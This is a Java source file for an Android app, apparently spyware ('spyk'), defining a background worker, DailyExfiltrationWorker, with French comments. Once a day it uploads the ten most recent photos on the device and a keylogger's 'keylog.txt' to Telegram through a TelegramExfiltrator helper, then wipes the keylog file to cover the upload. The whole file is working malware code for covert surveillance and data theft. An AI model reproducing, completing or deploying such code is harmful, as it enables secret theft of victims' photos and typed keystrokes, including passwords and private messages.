package com.ware.spyk;
import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class DailyExfiltrationWorker extends Worker {

    public DailyExfiltrationWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d("DailyExfiltrationWorker", "Exfiltration quotidienne en cours...");
        // 🖼️ 1. Exfiltration des photos
        File[] photos = PhotoCollector.getRecentPhotos(getApplicationContext(), 10);
        for (File photo : photos) {
            Log.d("DailyExfiltrationWorker", "Envoi de la photo : " + photo.getAbsolutePath());
            TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg", null);
        }

        // ⌨️ 2. Exfiltration du fichier de log du keylogger
        File keylog = new File(getApplicationContext().getFilesDir(), "keylog.txt");
        if (keylog.exists()) {
            Log.d("DailyExfiltrationWorker", "Envoi du fichier de log du keylogger");
            TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream", () -> {
                try {
                    new FileWriter(keylog, false).close();
                    Log.d("DailyExfiltrationWorker", "Fichier keylog vidé après envoi");
                } catch (IOException e) {
                    Log.e("Exfiltration", "Erreur vidage fichier", e);
                }
            });
        }

        return Result.success();
    }
}
